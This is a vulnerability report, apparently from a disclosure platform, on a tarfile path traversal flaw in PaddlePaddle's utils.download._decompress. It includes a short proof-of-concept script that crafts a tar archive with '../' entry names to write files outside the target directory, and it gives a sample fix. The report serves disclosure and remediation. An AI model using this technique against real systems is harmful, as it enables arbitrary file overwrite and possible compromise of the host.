Arbitrary file write during tarfile extraction at utils/download.py in paddlepaddle/paddle

Valid

Reported on Jan 24th 2024

Description

In utils.download, there is a function which is extracting tar files directly without removing the malicious entries inside the tar file which could lead to path traversal

Proof of Concept

Below code is used to generate malicious tar file

import tarfile

def change_name(tarinfo):
    tarinfo.name = "../../../../tmp/" + tarinfo.name
    return tarinfo

with tarfile.open("exploit.tar", "w:xz") as tar:
    tar.add("malicious.txt", filter=change_name)

Below is paddle code to deecompress a tar file

from paddle import utils

utils.download._decompress("exploit.tar")

Above code will extract malicious.txt in tmp directory in linux

Solution example:-

with tarfile.open(sys.argv[1]) as tar:
    for entry in tar:
        #GOOD: Check that entry is safe
        if os.path.isabs(entry.name) or ".." in entry.name:
            raise ValueError("Illegal tar archive entry")
        tar.extract(entry, "/tmp/unpack/")
